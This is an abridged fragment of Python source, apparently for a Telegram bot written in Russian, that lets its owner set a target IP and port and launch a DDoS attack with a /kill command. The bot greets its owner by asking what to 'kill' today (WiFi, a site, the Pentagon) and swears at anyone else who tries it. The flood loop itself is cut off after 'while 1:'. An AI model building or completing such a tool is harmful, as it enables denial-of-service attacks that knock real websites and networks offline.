...
def start_message(message):
    ...
    if message.chat.type == 'private':
        if str(message.from_user.id) == str(id):
            ...
            bot.send_message((message.chat.id), 'Привет мой хозяин! Что сегодня будем убивать? Ви фи, сайт, пентагон?', reply_markup=keyboard)
        else:
    ...
    if '/ip' in message.text.lower():
        if message.chat.type == 'private':
            if str(message.from_user.id) == str(id):
                ...
                ip = loll[1]
                bot.send_message(message.chat.id, f"Айпи для ддос установлен: {ip}")
            else:
                bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')
    elif message.text.lower() == 'помощь':
        if message.chat.type == 'private':
            if str(message.from_user.id) == str(id):
                bot.send_message(message.chat.id, 'Чтобы начать атаку на айпи нужно все настроить, сначало введи /ip set (айпи который хочеш ддосить), далее порт на который будет идти ддос /port set (порт), и наконец введи команду /kill для начала атаки.')
            else:
                bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')
        ...
        if message.chat.type == 'private':
            ...
            if message.chat.type == 'private':
                if str(message.from_user.id) == str(id):
                    try:
                        sent = 0
                        bot.send_message(message.chat.id, 'Атака успешно запущенна!')
                        while 1:
